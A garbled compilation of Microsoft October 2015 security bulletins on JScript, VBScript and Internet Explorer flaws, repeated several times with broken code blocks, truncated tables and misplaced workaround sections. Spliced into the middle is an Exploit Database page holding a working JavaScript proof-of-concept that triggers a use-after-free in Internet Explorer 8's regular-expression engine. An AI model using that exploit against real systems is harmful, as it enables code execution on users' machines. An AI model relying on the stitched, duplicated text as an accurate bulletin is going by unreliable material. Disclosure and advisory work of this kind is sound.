## Security Update for JScript and VBScript to Address Remote Code Execution (3089659)

Published: October 13, 2015

**Version:** 1.0

## Executive Summary

This security update resolves vulnerabilities in the VBScript and JScript scripting engines in Microsoft Windows. The more severe of the vulnerabilities could allow remote code execution if an attacker hosts a specially crafted website that is designed to exploit the vulnerabilities through Internet Explorer (or leverages a compromised website or a website that accepts or hosts user-provided content or advertisements) and then convinces a user to view the website. An attacker could also embed an ActiveX control marked "safe for initialization" in an application or Microsoft Office document that uses the IE rendering engine to direct the user to the specially crafted website.

An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user and, if the current user is logged on with administrative user rights, the attacker could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

This security update is rated Critical for affected versions of the JScript and VBScript scripting engines on supported editions of Windows Vista, Windows Server 2008, and Server Core installations of Windows Server 2008 R2. For more information, see the **Affected Software** section.

The update addresses the vulnerabilities by modifying how the VBScript and JScript scripting engines handle objects in memory, and helping to ensure that affected versions of VBScript properly implement the ASLR security feature. For more information about the vulnerabilities, see the **Vulnerability Information** section.

For more information about this update, see [Microsoft Knowledge Base Article 3089659](https://support.microsoft.com/kb/3089659).

## Update FAQ

**How do I determine which versions of JScript and VBScript scripting engines are installed on my system?**

The JScript and VBScript scripting engines are installed with supported releases of Microsoft Windows. In addition, installing a newer version of Internet Explorer on a system can change the version of the JScript and VBScript scripting engine that are installed.

To determine which versions of the JScript or VBScript scripting engines are installed on your system, perform the following steps:

1. Open Windows Explorer.
2. Navigate to the **%systemroot%\system32** directory.
3. For VBScript, right-click **vbscript.dll**, select **Properties**, and then click the **Details** tab.
4. For JScript, right-click **jscript.dll**, select **Properties**, and then click the **Details** tab.

The version number is listed in the **File Version** field. If your file version starts with 5.8, for example 5.8.7600.16385, then VBScript 5.8 is installed on your system.

**Once I know the version of the JScript or VBScript scripting engine installed on my system, where do I get the update?**

The affected software in this bulletin apply to systems without Internet Explorer installed and to systems with Internet Explorer 7 or earlier versions installed. Customers with systems running Internet Explorer 8 or later should apply the Internet Explorer Cumulative Update ([MS15-106](https://go.microsoft.com/fwlink/?linkid=625089)), which also addresses the vulnerability discussed in this bulletin.

The following table summarizes which bulletin provides the update by version of JScript and VBScript, and Internet Explorer.

## Vulnerability Information

## Multiple Scripting Engine Memory Corruption Vulnerabilities

Remote code execution vulnerabilities exist in the way that the VBScript and JScript engines, when handling objects in memory in Internet Explorer, render. In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerabilities through Internet Explorer and then convince a user to view the website. An attacker could also embed an ActiveX control marked "safe for initialization" in an application or Microsoft Office document that hosts the IE rendering engine. The attacker could also take advantage of compromised websites, and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit the vulnerabilities.

An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited the vulnerabilities could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

The update addresses the vulnerabilities by modifying how the VBScript and JScript scripting engines handle objects in memory.

The following table contains links to the standard entry for each vulnerability in the Common Vulnerabilities and Exposures list:

A security feature bypass exists when the VBScript and JScript engines fail to use the [Address Space Layout Randomization (ASLR)](https://technet.microsoft.com/library/security/dn848375.aspx) security feature, allowing an attacker to more reliably predict the memory offsets of specific instructions in a given call stack. The security feature bypass by itself does not allow arbitrary code execution. However, an attacker could use the ASLR bypass in conjunction with another vulnerability, such as a remote code execution vulnerability, that could take advantage of the ASLR bypass to more reliably run arbitrary code on a target system.

In a web-browsing scenario, successful exploitation of an ASLR bypass requires that a user, while logged on and running an affected version of Internet Explorer, browse to a malicious website. Therefore, any systems where a web browser is used frequently, such as workstations or terminal servers, are at the most risk from ASLR bypasses. Servers could be at more risk if administrators allow users to browse and read email on servers. However, best practices strongly discourage allowing this.

The update addresses this ASLR bypass by helping to ensure that affected versions of VBScript properly implement the ASLR security feature.

Microsoft received information about this vulnerability through coordinated vulnerability disclosure. When this security bulletin was originally issued, Microsoft had not received any information to indicate that the vulnerabilities had been publicly used to attack customers.

## Security Update for JScript and VBScript to Address Remote Code Execution (3089659)

Published: October 13, 2015

**Version:** 1.0

## Executive Summary

This security update resolves vulnerabilities in the VBScript and JScript scripting engines in Microsoft Windows. The more severe of the vulnerabilities could allow remote code execution if an attacker hosts a specially crafted website that is designed to exploit the vulnerabilities through Internet Explorer (or leverages a compromised website or a website that accepts or hosts user-provided content or advertisements) and then convinces a user to view the website. An attacker could also embed an ActiveX control marked "safe for initialization" in an application or Microsoft Office document that uses the IE rendering engine to direct the user to the specially crafted website.

An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user and, if the current user is logged on with administrative user rights, the attacker could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

This security update is rated Critical for affected versions of the JScript and VBScript scripting engines on supported editions of Windows Vista, Windows Server 2008, and Server Core installations of Windows Server 2008 R2. For more information, see the **Affected Software** section.

The update addresses the vulnerabilities by modifying how the VBScript and JScript scripting engines handle objects in memory, and helping to ensure that affected versions of VBScript properly implement the ASLR security feature. For more information about the vulnerabilities, see the **Vulnerability Information** section.

For more information about this update, see [Microsoft Knowledge Base Article 3089659](https://support.microsoft.com/kb/3089659).

## Update FAQ

**How do I determine which versions of JScript and VBScript scripting engines are installed on my system?**

The JScript and VBScript scripting engines are installed with supported releases of Microsoft Windows. In addition, installing a newer version of Internet Explorer on a system can change the version of the JScript and VBScript scripting engine that are installed.

To determine which versions of the JScript or VBScript scripting engines are installed on your system, perform the following steps:

1. Open Windows Explorer.
2. Navigate to the **%systemroot%\system32** directory.
3. For VBScript, right-click **vbscript.dll**, select **Properties**, and then click the **Details** tab.
4. For JScript, right-click **jscript.dll**, select **Properties**, and then click the **Details** tab.

The version number is listed in the **File Version** field. If your file version starts with 5.8, for example 5.8.7600.16385, then VBScript 5.8 is installed on your system.

**Once I know the version of the JScript or VBScript scripting engine installed on my system, where do I get the update?**

The affected software in this bulletin apply to systems without Internet Explorer installed and to systems with Internet Explorer 7 or earlier versions installed. Customers with systems running Internet Explorer 8 or later should apply the Internet Explorer Cumulative Update ([MS15-106](https://go.microsoft.com/fwlink/?linkid=625089)), which also addresses the vulnerability discussed in this bulletin.

The following table summarizes which bulletin provides the update by version of JScript and VBScript, and Internet Explorer.

## Vulnerability Information

## Multiple Scripting Engine Memory Corruption Vulnerabilities

Remote code execution vulnerabilities exist in the way that the VBScript and JScript engines, when handling objects in memory in Internet Explorer, render. In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerabilities through Internet Explorer and then convince a user to view the website. An attacker could also embed an ActiveX control marked "safe for initialization" in an application or Microsoft Office document that hosts the IE rendering engine. The attacker could also take advantage of compromised websites, and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit the vulnerabilities.

An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited the vulnerabilities could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

The update addresses the vulnerabilities by modifying how the VBScript and JScript scripting engines handle objects in memory.

The following table contains links to the standard entry for each vulnerability in the Common Vulnerabilities and Exposures list:

| **Vulnerability title** | **CVE number** | **Publicly disclosed** | **Exploited** |
| --- | --- | --- | --- |
| Scripting Engine Memory Corruption Vulnerability | [CVE-2015-2482](https://www.cve.org/CVERecord?id=CVE-2015-2482) | No | No |
| Scripting Engine Memory Corruption Vulnerability | [CVE-2015-6055](https://www.cve.org/CVERecord?id=CVE-2015-6055) | No | No |

    ```

## VBScript and JScript ASLR Bypass - CVE-2015-6052

A security feature bypass exists when the VBScript and JScript engines fail to use the [Address Space Layout Randomization (ASLR)](https://technet.microsoft.com/library/security/dn848375.aspx) security feature, allowing an attacker to more reliably predict the memory offsets of specific instructions in a given call stack. The security feature bypass by itself does not allow arbitrary code execution. However, an attacker could use the ASLR bypass in conjunction with another vulnerability, such as a remote code execution vulnerability, that could take advantage of the ASLR bypass to more reliably run arbitrary code on a target system.

In a web-browsing scenario, successful exploitation of an ASLR bypass requires that a user, while logged on and running an affected version of Internet Explorer, browse to a malicious website. Therefore, any systems where a web browser is used frequently, such as workstations or terminal servers, are at the most risk from ASLR bypasses. Servers could be at more risk if administrators allow users to browse and read email on servers. However, best practices strongly discourage allowing this.

The update addresses this ASLR bypass by helping to ensure that affected versions of VBScript properly implement the ASLR security feature.

Microsoft received information about this vulnerability through coordinated vulnerability disclosure. When this security bulletin was originally issued, Microsoft had not received any information to indicate that the vulnerabilities had been publicly used to attack customers.

### Mitigating Factors

Microsoft has not identified any [mitigating factors](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

### Workarounds

The following [workarounds](https://technet.microsoft.com/library/security/dn848375.aspx) may be helpful in your situation:

* **Restrict access to VBScript.dll**

  + For 32-bit systems, enter the following command at an administrative command prompt:

    ```
    takeown /f %windir%\system32\vbscript.dll
    cacls %windir%\system32\vbscript.dll /E /P everyone:N

    ```
    takeown /f %windir%\syswow64\vbscript.dll
    cacls %windir%\syswow64\vbscript.dll /E /P everyone:N

    ```

  **Impact of Workaround.** Websites that use VBScript may not work properly.

  **How to undo the workaround.**

  + For 32-bit systems, enter the following command at an administrative command prompt:

    ```
    cacls %windir%\system32\vbscript.dll /E /R everyone

Source: http://blog.skylined.nl/20161116001.html

Synopsis

A specially crafted web-page can cause the Javascript engine of Microsoft Internet Explorer 8 to free memory used for a string. The code will keep a reference to the string and can be forced to reuse it when compiling a regular expression.

Known affected software, attack vectors and mitigations

Microsoft Internet Explorer 8

An attacker would need to get a target user to open a specially crafted web-page. Disabling Javascript should prevent an attacker from triggering the vulnerable code path.

    // This Po­C attempts to exploit a use-after-free bug in Microsoft Internet
    // Explorer 8.
    // See http://blog.skylined.nl/20161116001.html for details.
    var r=new Reg­Exp("A|x|x|xx|xxxxxxxxxxxxxxxxxxxx+", "g");
    "A".replace(r, function (){
      // Force OLEAUT32 to free the string
      for (var j = 0; j < 16; j++) new Array(0x1000).join("B");
      // Reuse the freed memory
      r.compile();
    });

<!--
Description

Recompiling the regular expression pattern during a replace can cause the code to reuse a freed string, but only if the string is freed from the cache by allocating and freeing a number of strings of certain size, as explained by Alexander Sotirov in his Heap Feng-Shui presentation.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## In this article

## Cumulative Security Update for Internet Explorer (3096441)

Published: October 13, 2015 | Updated: January 27, 2016

**Version:** 2.1

## Executive Summary

This security update resolves vulnerabilities in Internet Explorer. The most severe of the vulnerabilities could allow remote code execution if a user views a specially crafted webpage using Internet Explorer. An attacker who successfully exploited these vulnerabilities could gain the same user rights as the current user. Customers whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.

This security update is rated Critical for Internet Explorer 7 (IE 7), Internet Explorer 8 (IE 8), Internet Explorer 9 (IE 9), Internet Explorer 10 (IE 10), and Internet Explorer 11 (IE 11) on affected Windows clients, and Moderate for Internet Explorer 7 (IE 7), Internet Explorer 8 (IE 8), Internet Explorer 9 (IE 9), Internet Explorer 10 (IE 10), and Internet Explorer 11 (IE 11) on affected Windows servers. For more information, see the **Affected Software** section.

The security update addresses the vulnerabilities by:

* Modifying how Internet Explorer, JScript, VBScript and certain functions handle objects in memory
* Adding additional permission validations to Internet Explorer

For more information about the vulnerabilities, see the **Vulnerability Information** section.

For more information about this update, see [Microsoft Knowledge Base Article 3096441](https://support.microsoft.com/kb/3096441).

## Affected Software

The following software versions or editions are affected. Versions or editions that are not listed are either past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, see [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

## Vulnerability Information

## Multiple Internet Explorer Memory Corruption Vulnerabilities

Remote code execution vulnerabilities exist when Internet Explorer improperly accesses objects in memory. These vulnerabilities could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user.

An attacker could host a specially crafted website that is designed to exploit these vulnerabilities through Internet Explorer, and then convince a user to view the website. The attacker could also take advantage of compromised websites and websites that accept or host user-provided content or advertisements by adding specially crafted content that could exploit these vulnerabilities. In all cases, however, an attacker would have no way to force users to view the attacker-controlled content. Instead, an attacker would have to convince users to take action, typically by getting them to click a link in an instant messenger or email message that takes users to the attacker's website, or by getting them to open an attachment sent through email.

An attacker who successfully exploited these vulnerabilities could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited these vulnerabilities could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Systems where Internet Explorer is used frequently, such as workstations or terminal servers, are at the most risk from these vulnerabilities.

The update addresses the vulnerabilities by modifying how Internet Explorer handles objects in memory.

The following table contains links to the standard entry for each vulnerability in the Common Vulnerabilities and Exposures list:

| **Vulnerability title** | **CVE number** | **Publicly disclosed** | **Exploited** |
| --- | --- | --- | --- |
| Internet Explorer Memory Corruption Vulnerability | [CVE-2015-6042](https://www.cve.org/CVERecord?id=CVE-2015-6042) | No | No |

### Mitigating Factors

Microsoft has not identified any [mitigating factors](https://technet.microsoft.com/library/security/dn848375.aspx) for these vulnerabilities.

### Workarounds

Microsoft has not identified any [workarounds](https://technet.microsoft.com/library/security/dn848375.aspx) for these vulnerabilities.

### FAQ

**I am running Internet Explorer on Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, or Windows Server 2012 R2. Does this mitigate these vulnerabilities?**

Yes. By default, Internet Explorer on Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2 runs in a restricted mode that is known as [Enhanced Security Configuration](https://technet.microsoft.com/library/dd883248). Enhanced Security Configuration is a group of preconfigured settings in Internet Explorer that can reduce the likelihood of a user or administrator downloading and running specially crafted web content on a server. This is a mitigating factor for websites that you have not added to the Internet Explorer Trusted sites zone.

**Can EMET help mitigate attacks that attempt to exploit these vulnerabilities?**

Yes. The Enhanced Mitigation Experience Toolkit (EMET) enables users to manage security mitigation technologies that help make it more difficult for attackers to exploit memory corruption vulnerabilities in a given piece of software. EMET can help mitigate attacks that attempt to exploit these vulnerabilities in Internet Explorer on systems where EMET is installed and configured to work with Internet Explorer.

For more information about EMET, see the [Enhanced Mitigation Experience Toolkit](https://technet.microsoft.com/security/jj653751).

## Multiple Scripting Engine Memory Corruption Vulnerabilities

Remote code execution vulnerabilities exist in the way that the VBScript and JScript engines, when handling objects in memory in Internet Explorer, render. In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerabilities through Internet Explorer and then convince a user to view the website. An attacker could also embed an ActiveX control marked "safe for initialization" in an application or Microsoft Office document that hosts the IE rendering engine. The attacker could also take advantage of compromised websites, and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit the vulnerabilities.

An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited the vulnerabilities could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

The update addresses the vulnerabilities by modifying how the VBScript and JScript scripting engines handle objects in memory.

## Multiple Internet Explorer Elevation of Privilege Vulnerabilities

Elevation of privilege vulnerabilities exist when Internet Explorer does not properly validate permissions under specific conditions, potentially allowing a script to be run with elevated privileges.

In a web-based attack scenario, an attacker could host a website that is used to attempt to exploit this vulnerability. In addition, compromised websites and websites that accept or host user-provided content could contain specially crafted content that could exploit these vulnerabilities. In all cases, however, an attacker would have no way to force users to view the attacker-controlled content. Instead, an attacker would have to convince users to take action. For example, an attacker could trick users into clicking a link that takes them to the attacker's site. An attacker who successfully exploited the vulnerabilities could elevate privileges in affected versions of Internet Explorer.

The vulnerabilities by themselves do not allow arbitrary code to be run. However, the vulnerabilities could be used in conjunction with another vulnerability (e.g., a remote code execution vulnerability) that could take advantage of the elevated privileges when running arbitrary code. For example, an attacker could exploit another vulnerability to run arbitrary code through Internet Explorer, but due to the context in which processes are launched by Internet Explorer, the code might be restricted to run at a low integrity level (very limited permissions). However, an attacker could, in turn, exploit the vulnerabilities to cause the arbitrary code to run at a medium integrity level (permissions of the current user).

The update addresses the vulnerabilities by adding permission validations to Internet Explorer.

The following table contains links to the standard entry for each vulnerability in the Common Vulnerabilities and Exposures list:

Microsoft has not identified any [mitigating factors](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

### Workarounds

The following [workarounds](https://technet.microsoft.com/library/security/dn848375.aspx) may be helpful in your situation:

* **Remove the .rdp file association**

  **Interactive method:**

  1. Click **Start**, click **Run**, type **regedit**, and then click **OK**.
  2. Expand **HKEY\_CLASSES\_ROOT**, click **RDP.File**, and then click the **File** menu and select **Export**.
  3. In the **Export Registry File** dialog box, type **RDPfile HKCR file association registry backup.reg** and click **Save**.

     **Note** This will create a backup of this registry key in the My Documents folder by default.
  4. Press the **Delete** key on the keyboard to delete the registry key. When prompted to delete the registry value, click **Yes**.
  5. Expand **HKEY\_CURRENT\_USER**, expand **Software**, expand **Microsoft**, expand **Windows**, expand **CurrentVersion**, expand **Explorer**, and then expand **FileExts**.
  6. Click **.rdp**, and then click the **File** menu and select **Export**.
  7. In the **Export Registry File** dialog box, type **rdp HKCU file association registry backup.reg** and click **Save**.

     **Note** This will create a backup of this registry key in the My Documents folder by default.
  8. Press the **Delete** key on the keyboard to delete the registry key. When prompted to delete the registry value, click **Yes**.

  **Managed deployment script method:**

  1. Make a backup copy of the registry keys from a managed deployment script with the following commands:

     ```
     Regedit.exe /e rdpfile_HKCR_registry_backup.reg HKEY_CLASSES_ROOT\RDP.File
     Regedit.exe /e rdp_HKCU_registry_backup.reg HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.rdp

     ```
  2. Save the following to a file with a .REG extension (that is Delete\_rdp\_file\_association.reg):

     ```
     Windows Registry Editor Version 5.00
     [-HKEY_CLASSES_ROOT\RDP.File]
     [-HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.rdp]

     ```
  3. Run the registry script that you created in step 2 on the target machine with the following command:

     ```
     Regedit.exe /s Delete_rdp_file_association.reg

     ```

  **Impact of workaround.** Double-clicking an .rdp file will no longer start mstsc.exe.

  **How to undo the workaround:**

  Restore the registry key by using Regedit to restore the settings saved in the .REG files.

## Internet Explorer Information Disclosure Vulnerability - CVE-2015-6053

An information disclosure vulnerability exists when Internet Explorer improperly discloses the contents of its memory.

An attacker who successfully exploited this vulnerability could provide the attacker with information to further compromise the userâs system.

The update addresses the vulnerability by changing the way certain functions handle objects in memory. Microsoft received information about the vulnerability through coordinated vulnerability disclosure. When this security bulletin was originally issued, Microsoft had not received any information to indicate that the vulnerabilities had been publicly used to attack customers.

### Mitigating Factors

Microsoft has not identified any [mitigating factors](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

### Workarounds

## VBScript and JScript ASLR Bypass - CVE-2015-6052

A security feature bypass exists when the VBScript and JScript engines fail to use the [Address Space Layout Randomization (ASLR)](https://technet.microsoft.com/library/security/dn848375.aspx) security feature, allowing an attacker to more reliably predict the memory offsets of specific instructions in a given call stack. The security feature bypass by itself does not allow arbitrary code execution. However, an attacker could use the ASLR bypass in conjunction with another vulnerability, such as a remote code execution vulnerability, that could take advantage of the ASLR bypass to more reliably run arbitrary code on a target system.

In a web-browsing scenario, successful exploitation of an ASLR bypass requires that a user is logged on and running an affected version of Internet Explorer, and browses to a malicious website. Therefore, any systems where a web browser is used frequently, such as workstations or terminal servers, are at the most risk from ASLR bypasses. Servers could be at more risk if administrators allow users to browse and read email on servers. However, best practices strongly discourage allowing this.

The update addresses this ASLR bypass by helping to ensure that affected versions of VBScript properly implement the ASLR security feature. Microsoft received information about this vulnerability through coordinated vulnerability disclosure. When this security bulletin was originally issued, Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers.

```
Recompiling the regular expression pattern during a replace can cause
the code
to reuse a freed string, but only if the string is freed from the cache by
allocating and freeing a number of strings of certain size.

## Security Update for JScript and VBScript to Address Remote Code Execution (3089659)

Published: October 13, 2015

**Version:** 1.0

## Executive Summary

This security update resolves vulnerabilities in the VBScript and JScript scripting engines in Microsoft Windows. The more severe of the vulnerabilities could allow remote code execution if an attacker hosts a specially crafted website that is designed to exploit the vulnerabilities through Internet Explorer (or leverages a compromised website or a website that accepts or hosts user-provided content or advertisements) and then convinces a user to view the website. An attacker could also embed an ActiveX control marked "safe for initialization" in an application or Microsoft Office document that uses the IE rendering engine to direct the user to the specially crafted website.

An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user and, if the current user is logged on with administrative user rights, the attacker could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

This security update is rated Critical for affected versions of the JScript and VBScript scripting engines on supported editions of Windows Vista, Windows Server 2008, and Server Core installations of Windows Server 2008 R2. For more information, see the **Affected Software** section.

The update addresses the vulnerabilities by modifying how the VBScript and JScript scripting engines handle objects in memory, and helping to ensure that affected versions of VBScript properly implement the ASLR security feature. For more information about the vulnerabilities, see the **Vulnerability Information** section.

For more information about this update, see [Microsoft Knowledge Base Article 3089659](https://support.microsoft.com/kb/3089659).

## Affected Software

The following versions of JScript and VBScript are affected by the vulnerability discussed in this bulletin. Earlier versions or editions that are not listed are either past their [support life cycle](https://go.microsoft.com/fwlink/?linkid=21742) or are not affected. The following affected software apply to systems with Internet Explorer 7 or earlier installed and to systems without Internet Explorer installed. Customers with systems running Internet Explorer 8 or later should apply Internet Explorer Cumulative Update 3093983 ([MS15-106](https://go.microsoft.com/fwlink/?linkid=625089)), which also addresses the vulnerability discussed in this bulletin.

## Update FAQ

**How do I determine which versions of JScript and VBScript scripting engines are installed on my system?**

The JScript and VBScript scripting engines are installed with supported releases of Microsoft Windows. In addition, installing a newer version of Internet Explorer on a system can change the version of the JScript and VBScript scripting engine that are installed.

To determine which versions of the JScript or VBScript scripting engines are installed on your system, perform the following steps:

1. Open Windows Explorer.
2. Navigate to the **%systemroot%\system32** directory.
3. For VBScript, right-click **vbscript.dll**, select **Properties**, and then click the **Details** tab.
4. For JScript, right-click **jscript.dll**, select **Properties**, and then click the **Details** tab.

The version number is listed in the **File Version** field. If your file version starts with 5.8, for example 5.8.7600.16385, then VBScript 5.8 is installed on your system.

**Once I know the version of the JScript or VBScript scripting engine installed on my system, where do I get the update?**

The affected software in this bulletin apply to systems without Internet Explorer installed and to systems with Internet Explorer 7 or earlier versions installed. Customers with systems running Internet Explorer 8 or later should apply the Internet Explorer Cumulative Update ([MS15-106](https://go.microsoft.com/fwlink/?linkid=625089)), which also addresses the vulnerability discussed in this bulletin.

## Vulnerability Information

## Multiple Scripting Engine Memory Corruption Vulnerabilities

Remote code execution vulnerabilities exist in the way that the VBScript and JScript engines, when handling objects in memory in Internet Explorer, render. In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerabilities through Internet Explorer and then convince a user to view the website. An attacker could also embed an ActiveX control marked "safe for initialization" in an application or Microsoft Office document that hosts the IE rendering engine. The attacker could also take advantage of compromised websites, and websites that accept or host user-provided content or advertisements. These websites could contain specially crafted content that could exploit the vulnerabilities.

An attacker who successfully exploited the vulnerabilities could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited the vulnerabilities could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

The update addresses the vulnerabilities by modifying how the VBScript and JScript scripting engines handle objects in memory.

The following table contains links to the standard entry for each vulnerability in the Common Vulnerabilities and Exposures list:

| **Vulnerability title** | **CVE number** | **Publicly disclosed** | **Exploited** |

### Workarounds

The following [workarounds](https://technet.microsoft.com/library/security/dn848375.aspx) may be helpful in your situation:

* **Restrict access to VBScript.dll and JScript.dll**

  + For 32-bit systems, enter the following command at an administrative command prompt:

    ```
    takeown /f %windir%\system32\vbscript.dll
    cacls %windir%\system32\vbscript.dll /E /P everyone:N
    cacls %windir%\system32\jscript.dll /E /P everyone:N

    ```
  + For 64-bit systems, enter the following command at an administrative command prompt:

    ```
    takeown /f %windir%\syswow64\vbscript.dll
    cacls %windir%\syswow64\vbscript.dll /E /P everyone:N
    cacls %windir%\syswow64\jscript.dll /E /P everyone:N

    ```

  **Impact of Workaround.** Websites that use VBScript or JScript may not work properly.

  **How to undo the workaround.**

  + For 32-bit systems, enter the following command at an administrative command prompt:

    ```
    cacls %windir%\system32\vbscript.dll /E /R everyone
    cacls %windir%\system32\jscript.dll /E /R everyone

    ```
  + For 64-bit systems, enter the following command at an administrative command prompt:

    ```
    cacls %windir%\syswow64\vbscript.dll /E /R everyone
    cacls %windir%\syswow64\jscript.dll /E /R everyone

    ```

## VBScript and JScript ASLR Bypass - CVE-2015-6052

A security feature bypass exists when the VBScript and JScript engines fail to use the [Address Space Layout Randomization (ASLR)](https://technet.microsoft.com/library/security/dn848375.aspx) security feature, allowing an attacker to more reliably predict the memory offsets of specific instructions in a given call stack. The security feature bypass by itself does not allow arbitrary code execution. However, an attacker could use the ASLR bypass in conjunction with another vulnerability, such as a remote code execution vulnerability, that could take advantage of the ASLR bypass to more reliably run arbitrary code on a target system.

In a web-browsing scenario, successful exploitation of an ASLR bypass requires that a user, while logged on and running an affected version of Internet Explorer, browse to a malicious website. Therefore, any systems where a web browser is used frequently, such as workstations or terminal servers, are at the most risk from ASLR bypasses. Servers could be at more risk if administrators allow users to browse and read email on servers. However, best practices strongly discourage allowing this.

The update addresses this ASLR bypass by helping to ensure that affected versions of VBScript properly implement the ASLR security feature.

Microsoft received information about this vulnerability through coordinated vulnerability disclosure. When this security bulletin was originally issued, Microsoft had not received any information to indicate that the vulnerabilities had been publicly used to attack customers.

## Scripting Engine Information Disclosure Vulnerability - CVE-2015-6059

An information disclosure vulnerability exists when JScript or VBScript improperly discloses the contents of its memory, which could provide an attacker with information to further compromise the userâs computer or data.

To exploit the vulnerability, an attacker must know the memory address of where the object was created. The update addresses the vulnerability by changing the way certain functions handle objects in memory.
